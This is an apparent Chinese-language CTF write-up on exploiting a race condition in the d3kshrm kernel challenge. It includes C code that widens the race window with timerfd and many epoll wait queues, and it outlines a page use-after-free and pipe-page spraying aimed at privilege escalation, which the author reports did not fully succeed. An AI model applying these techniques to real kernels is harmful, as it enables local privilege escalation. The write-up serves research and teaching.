Racing against the clock – hitting a tiny kernel race window

首先简单解释一下该方法的作用，该方法可以在关闭CONFIG_PREEMPT时来扩大race window，要扩大race window我们需要

  • 使timerfd在竞争窗口中到期
  • 确保timerfd触发唤醒时需要处理epoll创建的尽可能多的等待队列项，epoll创建的队列越多，扩大的时间越长

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

static void do_epoll_enqueue(int fd, int f)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < f; k++)
	{
		childs[k] = fork();
		if (childs[k] == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = SYSCHK(dup(fd));
			}
			for (int i = 0; i < 0x10; i++)
			{
				epfds[i] = SYSCHK(epoll_create(0x1));
			}
			for (int i = 0; i < 0x10; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], timebuf, 1);
			raise(SIGSTOP);
		}
		read(cfd[0], timebuf, 1);
	}
}

int main(){
    int stop_time = 50000;
    int tfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
	do_epoll_enqueue(tfd, 1);
	int tfd2 = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));

    struct itimerspec new = {.it_value.tv_nsec = stop_time};
    SYSCHK(timerfd_settime(tfd2, TFD_TIMER_CANCEL_ON_SET, &new, NULL));
}

漏洞利用

回到该题目，该题目的race window 还是比较大的，例如一个线程我们申请0x200个pages，然后release掉，此时会遍历pages进行free_pages,在遍历的时候我们另外一个线程fault第一个page,fault完成后该page被释放，因此此时我们便可以编辑一个在free area中的page，但是由于fault的时候会增加该page的refcount，如果是write还会改变该page的type，在申请page的时候会检测这些字段，因此我们并不能将该page拿回来。

理论上如果我们通过堆喷结构体在fault之前将该page拿回来，那我们就可以对该page中的结构体进行读写，从而进行提权。

为了验证该思路，我将核心开到了3，新起一个线程，不断的喷射pipe的page，同时通过微调timerfd到期的时间，最终可以做到近乎100%概率的将pipe page和fault的page重合。所以理论上可以将pipe page换为其他的结构体来完成提权的效果。

但是因为race window 估计还不足够大的缘故，我最终并没有实现将结构体和fault page重合的效果。如果有师傅看到这篇博客并有兴趣继续尝试，下面是我的poc

总结

本文记录了一次内核漏洞利用的尝试，主要关注d3kshrm题目中的条件竞争漏洞利用。通过参考Google Project Zero的扩大race window技术，使用timerfd和epoll队列扩展竞争窗口，成功实现了pipe page与fault page的重合。虽然理论上可以通过堆喷结构体实现对UAF page的读写进而提权，但由于race window可能仍不够大，最终未能成功实现结构体与fault page的重合。文章提供了POC代码，以供后续研究参考。
